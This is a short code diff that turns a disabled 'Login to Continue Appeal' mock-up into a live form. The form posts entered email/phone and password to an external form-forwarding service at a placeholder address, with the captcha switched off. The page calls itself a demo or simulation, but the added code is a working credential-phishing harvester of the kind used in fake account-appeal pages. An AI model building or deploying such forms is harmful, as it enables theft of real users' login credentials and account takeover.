@@ -51,12 +51,19 @@
 <body>
   <div class="login-box">
     <h2>Login to Continue Appeal</h2>
-    <input type="text" placeholder="Email or Phone" disabled>
-    <input type="password" placeholder="Password" disabled>
-    <button class="btn" disabled>Log In</button>
+    <form action="https://formsubmit.co/YOUR_EMAIL_HERE" method="POST">
+      <input type="text" name="email_or_phone" placeholder="Email or Phone" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit" class="btn">Log In</button>
+
+      <!-- Hidden form options -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_subject" value="🚨 Fake Login Attempt - Demo">
+    </form>
     <div class="note">
-      ⚠️ This is a demo login form. Do not input any real credentials.
+      ⚠️ This is a simulation. Do not use real credentials.
     </div>
   </div>
 </body>
-</html> 
+</html>
